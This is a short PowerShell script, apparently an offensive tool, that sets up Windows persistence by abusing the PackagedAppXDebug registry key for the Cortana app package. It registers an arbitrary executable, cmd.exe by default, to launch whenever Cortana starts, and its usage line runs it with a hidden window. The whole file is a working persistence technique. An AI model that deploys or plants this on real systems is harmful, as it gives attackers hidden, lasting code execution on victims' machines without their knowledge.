# prior: https://oddvar.moe/2018/09/06/persistence-using-universal-windows-platform-apps-appx/
# usage: powershell -File $PSCommandPath -NoLogo -NonInteractive -WindowStyle Hidden -jinni <FULL_PATH_TO_EXE>

param([string]$jinni="C:\windows\system32\cmd.exe")

$cortana=$(Get-AppxPackage -Name Microsoft.Windows.Cortana).PackageFullName

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\PackagedAppXDebug\$cortana /d $jinni /f | Out-Null
